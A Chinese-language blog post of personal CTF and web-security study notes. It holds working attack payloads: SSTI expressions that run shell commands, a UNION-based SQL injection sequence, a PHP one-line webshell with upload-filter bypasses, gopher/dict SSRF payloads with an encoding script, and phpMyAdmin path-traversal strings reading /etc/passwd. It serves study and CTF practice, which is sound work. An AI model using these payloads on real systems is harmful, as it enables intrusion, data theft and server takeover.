---
title: CyberSafe_Notes
date: 2023-04-19 13:18:06
categories:
- 网络安全
tags:
- web 
description: |
    我的记性貌似也不是很好，可能只是对别人吧
---
## 基本的dos命令

- `dir` - 显示当前目录下的文件和子目录
- `cd <directory>` - 更改当前目录到指定目录
- `mkdir <directory_name>` - 创建新目录
- `rmdir <directory_name>` - 删除目录
- `copy <source> <destination>` - 复制文件或目录
- `move <source> <destination>` - 移动文件或目录
- `del <filename>` - 删除文件
- `rename <old_filename> <new_filename>` - 重命名文件或目录
- `type <filename>` - 显示文件的内容
- `find /i "text" <filename>` - 在文件中查找指定的文本
- `attrib <filename>` - 显示或更改文件属性
- `cls` - 清屏
- `echo <text>` - 显示文本
- `systeminfo` - 显示计算机的详细系统信息
- `gpupdate /force` - 强制更新计算机的组策略设置
- `shutdown /r` - 重新启动计算机
- `shutdown /s` - 关闭计算机
- `ping <hostname_or_ip_address>` - 向指定的主机或 IP 发送 ICMP 回显请求以测试网络连接
- `ipconfig /all` - 显示所有网络接口的详细配置信息
- `ipconfig /release` - 释放当前的 IP 地址配置
- `ipconfig /renew` - 重新获取 IP 地址
- `ipconfig /flushdns` - 清空 DNS 解析缓存
- `netstat -a` - 显示所有活动网络连接和侦听端口
- `netstat -ano` - 显示所有活动网络连接、侦听端口及其关联的进程 ID
- `netstat -r` - 显示 IP 路由表
- `tracert <hostname_or_ip_address>` - 显示到指定目标的 IP 数据包路径
- `nslookup <hostname_or_ip_address>` - 查询 DNS，获取指定主机名或 IP 地址的详细信息
- `arp -a` - 显示本地 ARP 缓存表
- `route print` - 显示本地 IP 路由表
- `nbtstat -A <ip_address>` - 获取远程计算机的 NetBIOS 名称表
- `telnet <hostname_or_ip_address> <port>` - 用于远程登录和管理网络设备，需要注意的是 Telnet 传输数据不加密，存在安全隐患
- `net view` - 显示当前域或工作组中的计算机列表
- `net view \\<computername>` - 显示指定计算机上共享的资源列表
- `net user` - 显示用户帐户列表
- `net user <username>` - 显示指定用户帐户的详细信息
- `net use Z: /delete` - 删除指定的网络连接
- `net user <username>` - 显示指定用户的帐户信息
- `net user <username> *` - 更改指定用户的密码
- `net user <username> /add` - 添加新的用户帐户
- `net user <username> /delete` - 删除指定的用户帐户
- `net localgroup administrators` - 显示本地计算机上的管理员组成员
- `net localgroup administrators <username> /add` - 将用户添加到本地计算机的管理员组
- `net localgroup administrators <username> /delete` - 从本地计算机的管理员组中删除用户
- `net share` - 显示当前计算机上的共享资源
- `net localgroup` - 显示本地计算机上的用户组列表
- `net group` - 显示域中的用户组列表
- `net share` - 显示本地计算机上的共享资源列表
- `net use` - 显示计算机上的网络连接
- `systeminfo` - 显示计算机的详细系统信息
- `whoami /all` - 显示当前用户的详细信息，包括用户组和权限
- `route print` - 显示本地 IP 路由表
- `tracert <hostname_or_ip_address>` - 显示到指定目标的 IP 数据包路径
- `nslookup <hostname_or_ip_address>` - 查询 DNS，获取指定主机名或 IP 地址的详细信息
- `xcopy <source> <destination> /s /e` - 复制目录及其子目录，包括空目录
- `robocopy <source> <destination> /e` - 强大的文件复制工具，包括空目录
- `chkdsk <drive:>` - 检查指定磁盘上的磁盘错误
- `sfc /scannow` - 扫描系统文件并修复错误
- `gpresult /r` - 显示用户的组策略设置报告
- `tasklist` - 显示当前运行的进程
- `taskkill /im <process_name> /f` - 强制终止指定的进程
- `assoc <file_extension>` - 显示或修改文件扩展名关联
- `ftype <file_type>` - 显示或修改文件类型
- `compact <filename>` - 显示或修改 NTFS 分区上文件的压缩状态
- `diskpart` - 运行磁盘分区实用程序
- `tree <directory>` - 以树形结构显示目录及其子目录
- `title <text>` - 更改命令提示符窗口的标题
- `color <color_code>` - 更改命令提示符窗口的文本和背景颜色
- `set` - 显示、设置或删除环境变量
- `path` - 显示或设置可执行文件的搜索路径
- `hostname` - 显示计算机的主机名
- `whoami` - 显示当前用户的用户名和域
- `pause` - 暂停批处理文件的处理，等待用户按任意键
- `timeout /t <seconds>` - 在批处理文件中添加延时

## 信息泄露

### http协议

- GET请求
  - 请求行：包括请求方法（GET）、请求资源的路径（/index.html）以及HTTP协议版本（HTTP/1.1）
  - 请求头：包含了客户端提供的额外信息，如Host（目标主机名）、User-Agent（浏览器信息）、Accept（可接受的内容类型）等
  - 请求体：GET请求通常不包含请求体，因为GET请求主要用于获取资源，而不是发送数据

```bash
GET /index.html HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Connection: keep-alive
```

- GET响应
  - 状态行：包括HTTP协议版本（HTTP/1.1）、状态码（200）和状态描述（OK）
  - 响应头：包含了服务器提供的额外信息，如Date（响应时间）、Server（服务器软件信息）、Content-Type（资源类型）、Content-Length（资源大小）等
  - 响应体：包含了请求的资源内容，如HTML文档、图片数据等

```bash
HTTP/1.1 200 OK
Date: Fri, 21 Apr 2023 08:23:19 GMT
Server: Apache
Content-Type: text/html; charset=UTF-8
Content-Length: 12345
Connection: keep-alive
Last-Modified: Mon, 10 Apr 2023 14:00:00 GMT
ETag: "1a2b3c4d"

<!DOCTYPE html>
<html>
<head>
  <title>Example Page</title>
</head>
<body>
  <h1>Hello, World!</h1>
</body>
</html>
```

### vim 交换文件名

在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容
>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp
>再次意外退出后，将会产生名为 .index.php.swo 的交换文件
>第三次产生的交换文件则为 .index.php.swn

### 扫描目录

```bash
cd dirsearch
python dirsearch.py -u 网址 -e php 或 python .\dirsearch.py -u 网址 -e php
```

### .DS_Store文件泄露

```bash
.DS_Store(Desktop Services Store)是macOS目录下的隐藏文件, 包含了当前目录结构和一些的自定义信息, 如背景和图标位置等, 在windows下类似的文件为desktop.ini. 暴露了.DS_Store文件也就相当于暴露了该目录下的所有内容. 可以说是比较严重的泄露.
```

### Git泄漏

```bash
githacker --url http(s)://xxxxxx --output-folder ~/target
cd target
git log
git diff xxxx
git stash list 
git stash pop
git reflog 历史
//
wget -r url/.git
```

### SSTI

#### smarty

`{if system('cat /flag)}{/if}`

`{{config.items()}}`- Jinja2引擎解析这个字符串时，它会返回一个包含所有配置项的列表
`{{ config.__class__.__init__.__globals__['os'].popen('ls ../').read()}}`读取系统文件
`import os os.system('ls ../') os.system('cat ../flag')`

```bash
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("env").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}

```

`tplmap`

```bash
-d DATA：这个参数允许你设置HTTP请求的body内容。
-H HEADER：这个参数允许你设置HTTP请求的header。
-X METHOD：这个参数允许你设置HTTP请求的方法，如GET、POST等。
--os-shell：这个参数会尝试获取一个操作系统shell。
--os-cmd：这个参数允许你执行一个操作系统命令。
```

### svn泄漏

```bash
工具：dvcs-ripper tree
cd dvcs-ripper
perl ./rip-svn.pl -v -u url/.svn/
#ls -la -> ls -la.svn
tree -a .svn #-a代表显示隐藏文件
cat ...#根据具体文件查看信息
```

### hg泄漏

```bash
perl ./rip-hg.pl -v -u http://challenge-02ead012a55810f3.sandbox.ctfhub.com:10800/.hg
```

### 查询具体所含数据

`grep -ir flag`这是一个使用 grep 命令在文件中搜索特定字符串（本例中为 "flag"）的命令行指令。-i 选项表示大小写不敏感，-r 选项表示递归搜索文件夹

```bash
-i：忽略大小写
-n：显示匹配行的行号
-r：递归搜索文件夹中的文件
-w：查找整个单词匹配
-l：仅列出包含匹配项的文件名
-c：计算匹配行的数量
```

## 密码爆破

-弱

-常用

## sql注入

正道在此：！

```bash
1.查当前数据库名称

 ' or 1=1 union select 1,database(),3 limit 1,2;#-- 

得到数据库名称web2
2.查看数据库表的数量

' or 1=1 union select 1,(select count(*) from information_schema.tables where table_schema = 'web2'),3 limit 1,2;#-- 

得到数据库表数量为2
3.查表的名字

第一个表:

' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 0,1),3 limit 1,2;#-- 

得到表名：flag 第二个表:

' or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = 'web2' limit 1,2),3 limit 1,2;#-- 

得到表名：user
4.查flag表列的数量

' or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- 

只有1列
5.查flag表列的名字

' or 1=1 union select 1,(select column_name from information_schema.columns where table_name = 'flag' limit 0,1),3 limit 1,2;#-- 

列名为flag
6.查flag表记录的数量

' or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- 

只有一条记录
7.查flag表记录值

' or 1=1 union select 1,(select flag from flag limit 0,1),3 limit 1,2;#-- 

得到flag
```

为什么`username=xxx'or'1=1&password=xxx'or'1=1`可以达到SQL注入，从而直接输出表内容的目的。

假设我们的表名叫`t_user`，`username`为用户名字段，`password`为密码字段，只有当用户名和密码字段都正确的时候才能输出该数据的内容

`SELECT * FROM t_user WHERE username = 'xxx' AND password = "xxxx"`
但是我们通过在xxx后面拼接一个'号来闭合`username`的值，然后通过`or 1 = 1`使where的条件恒等于true，上面的SQL也就变成了

`SELECT * FROM t_user WHERE username='xxx'or 1 = 1 AND password='xxx'or 1 = 1`
从而可以查出所有的数据。

## 文件上传

>工具：蚁剑

- 一句话木马 `<?php eval(@$_POST['a']); ?>`

上传文件绕过限制：

>- 前端验证: 关闭前端js 或许改后缀名bp重发
>- .htaccess: 传入.htaccess文件内容为`AddType application/x-httpd-php x`or`SetHandler application/x-httpd-php`
>#x为格式 如.jpg .png 作用是用php格式打开这些文件，然后把一句话木马以对应后缀上传即可。(后者为把所有文件当成php处理)
>- 00截断:用户输入的url参数包含%00经过浏览器自动转码后截断后面字符.
> #需要注意的是 将`POST /?road=/var/www/html/upload/ HTTP/1.1`改为`POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1`。而不是更改 `filename="shell.png"`为`filename="shell.php%00png`
>- :对于某些限制png jpg等格式上传的，会对其文件头进行检测。如png 只需在一句话木马二进制文件前加上`89504E47` 再用bp重发，蚁剑连接。
>- 双写后缀:可能在出现`php php5 ajax`等后缀置为空白，构造`pphphp`后缀，则会置为php后缀
>- MIME绕过:如下所示

```bash
1.先对于服务器上传不同的文件，直至上传成功，然后利用BS进行抓包。查看报文的最后一段有Content-type字段部分
2.上传木马，修改Content-type
3.使用antSword进行连接
```

蚁剑，一句话木马，bp重发请求文件上传，配置文件绕过限制
数据库漏洞

## SSRF

### 伪协议

>已单独开了一篇文章 指路 [here](https://)

```bash
file:///
#file:///var/www/html/flag.php
dict://
#探测内网端口协议
sftp://
ldap://
tftp://
gopher://(万金油)
```

### 端口扫描

bp 攻击
`url=dict://127.0.0.1:8000`
`$8000$负载number8000-9000 step:1`

扫描找到数据字节不同的端口重发
`http://127.0.0.1:xxxx`

### POST请求

#### gopher协议

最终gopher协议伪造的http请求
`POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250Ahost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D5b69b89c146e1ed3b90708ffa267f06a`
三次URL解码得到的玩意:

```bash
POST /flag.php HTTP/1.1
host: 127.0.0.1:80
Content-Type: application/x-www-form-urlencoded
Content-Length: 36
key=5b69b89c146e1ed3b90708ffa267f06a
```

(但是我真的没看懂，日后再说)
大佬牛b！！！

```python
import urllib.parse

payload =\
"""
yourpayload
"""  # 注意后面一定要有回车，回车结尾表示http请求结束

tmp = urllib.parse.quote(payload)
new = tmp.replace('%0A', '%0D%0A')
new = urllib.parse.quote(new)
result = 'gopher://127.0.0.1:80/' + '_' + new
result = urllib.parse.quote(result)
print(result)
```

`GET /?url=http://127.0.0.1:80/index.php?url=result   HTTP/1.1`重发即可

## 一些漏洞

对于某些漏洞，查询版本即可
如phpmyadmin 4.80/4.81

- `?target=db_datadict.php%253f../../../../../../etc/passwd`
- `?target=db_datadict.php%253f../../../../../../flag`
即可获取flag

qs:
qs是负责url参数转换js库。

简单用法：foo[bar]=baz-->
```bash
assert.deepEqual(qs.parse('foo[bar]=baz'),{
    foo:{
      bar:'baz'
    }
});
#可嵌套对象
#   foo:{
#     bar:{
#         baz：'foobarbaz'
#     }
#   }
```

url:a=b&proxy=nginx-->
`{a:'b',proxy:'nginx'}`
qs最多解析1000个参数
所以
answer: `url/?a=1&a=1.............`

## END
